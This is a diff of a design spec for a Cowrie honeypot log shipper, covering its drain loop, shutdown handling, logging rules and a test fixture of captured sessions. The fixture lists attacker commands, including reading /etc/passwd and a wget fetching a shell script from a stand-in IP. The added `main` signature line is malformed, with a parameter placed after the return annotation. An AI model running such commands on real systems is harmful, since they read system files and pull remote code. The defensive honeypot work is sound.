@@ -190,7 +190,7 @@ client can no longer make the api buffer an unbounded body.
       # for path in spool.pending(): result = poster.post(path.read_bytes()); retry → backoff.wait(); return delivered (stop draining — the next iteration retries the SAME file first); not retry and 2xx → spool.remove; backoff.reset(); not retry and 4xx → spool.dead(path, status=status). Returns the count delivered.
   def run_once(tailer: LogTailer, assembler: SessionAssembler, spool: Spool, poster: Poster, backoff: Backoff) -> int
       # lines = tailer.read_new_lines(); for line: for payload in assembler.feed(line): spool.put(payload); for payload in assembler.flush_idle(): spool.put(payload); return drain(spool, poster, backoff)
-  def main(argv: Sequence[str] | None = None, *, env: Mapping[str, str] | None = None, transport: httpx.BaseTransport | None = None, max_iterations: int | None = None, sleep: Callable[[float], None] = time.sleep) -> int
+  def main(argv: Sequence[str] | None = None, *, env: Mapping[str, str] | None = None, transport: httpx.BaseTransport | None = None, max_iterations: int | None = None, sleep: Callable[[float], None] = time.sleep) -> int, stop_event: threading.Event | None = None    # test-author's SIGTERM mechanism (permitted judgment call): when given, the loop also stops after the current iteration once it is set; the SIGTERM/SIGINT handlers set the same event
       # argparse: --once (one run_once, exit 0), --state-dir/--log-path overrides (else config); builds the five collaborators from ShipperConfig.from_env(env or os.environ); loop: run_once; if no line was read this iteration → sleep(poll_interval_s); stops after max_iterations (tests) or SIGTERM/SIGINT (installs handlers that set a flag; the current iteration finishes — a payload is never half-written because the spool writes tmp+replace). Exit 0 on clean stop; 1 on ValueError from config (one stderr line naming the variable) or an unreadable state dir.
       # Logging: logging.basicConfig(level=INFO, format="%(levelname)s %(name)s %(message)s") to stderr — journald keeps it. One INFO line per delivered payload: "shipper: delivered session_id=%s status=%d bytes=%d". NEVER a username, password, command, banner, URL or IP from the log in any record (session_id is a Cowrie hex id and is the only per-session field logged).
   # sentinelbrief_shipper/__main__.py: raise SystemExit(main())
@@ -258,8 +258,8 @@ client can no longer make the api buffer an unbounded body.
 ## Interfaces → test table
 
 Every shipper test drives the real classes; the only fakes are `httpx.MockTransport` (the ingest
-URL), an injected `clock`, and an injected `sleep`. `fixtures/cowrie/cowrie.json` (JSON Lines, ~45
-lines, written by the test-author) holds exactly: session **A** (`a1b2c3d4e5f6`, `hp-use-01`,
+URL), an injected `clock`, and an injected `sleep`. `fixtures/cowrie/cowrie.json` (JSON Lines — the
+enumeration below sums to 23 lines; the test-author built exactly that) holds exactly: session **A** (`a1b2c3d4e5f6`, `hp-use-01`,
 `198.51.100.20`: connect, client.version, login.failed ×2, login.success, command.input ×3
 (`uname -a`, `cat /etc/passwd`, `wget http://203.0.113.9/x.sh`), session.file_download,
 session.closed with `duration_ms`), session **B** (`b2c3d4e5f6a7`, `198.51.100.21`: connect,
